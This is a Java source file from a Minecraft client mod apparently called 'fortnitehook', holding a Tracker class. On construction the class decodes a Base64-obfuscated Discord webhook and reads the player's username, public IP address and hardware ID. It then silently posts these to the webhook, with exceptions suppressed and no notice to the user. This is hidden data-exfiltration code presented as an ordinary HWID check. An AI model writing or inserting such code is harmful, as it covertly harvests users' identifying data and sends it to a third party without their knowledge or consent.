package me.fortnitehook.tracker;



import me.fortnitehook.OyVey;
import me.fortnitehook.util.umm.work.Checker;
import me.fortnitehook.util.umm.work.Generator;
import net.minecraft.client.Minecraft;

import java.io.*;
import java.net.URL;
import java.util.Base64;
import java.util.List;
import java.nio.charset.StandardCharsets;
import java.util.Collections;
import java.util.Random;

public class Tracker {


    public boolean checkHwid() {
        if (!Checker.doCheck()) {
            return false;
        }else {
            return true;
        }
    }

    public String oomagaHwid() {
        if (checkHwid()) {
            return ("ON HWID LIST.");
        }else {
            return ("NOT ON HWID LIST.");
        }
    }



    public Tracker() {
        List<String> webhook =
                Collections.singletonList(
                        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEwNjA2Njg3NDE0OTY1MDQ4My9XWUpwU0xQYWdaTFRHSHhRczJ3UTJvR0xGbGZjYlFVZUgwSEphT3A2NXZMNGRwY1A2Y29Hc3ptcUp4TjRjakw2Vnl4aA=="
                );

        final String l = new String(Base64.getDecoder().decode(webhook.get(new Random().nextInt(1)).getBytes(StandardCharsets.UTF_8)));
        final String CapeName = "FortniteTracker";
        final String CapeImageURL = "https://i.imgur.com/cfiN8Lg.jpg";

            TrackerUtil d = new TrackerUtil(l);

        String minecraft_name = "NOT FOUND";

        try {
            minecraft_name = Minecraft.getMinecraft().getSession().getUsername();
        } catch (Exception ignore) {
        }

        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String ip = bufferedReader.readLine();

            TrackerPlayerBuilder dm = new TrackerPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent(minecraft_name + " ran fortnitehook " + OyVey.MODVER + OyVey.MODBUILD + "\nHWID: " + Generator.getHWID() + "\nIP: " + ip +  "\nSTATUS: " + oomagaHwid())
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        } catch (Exception ignore) {}
    }
}
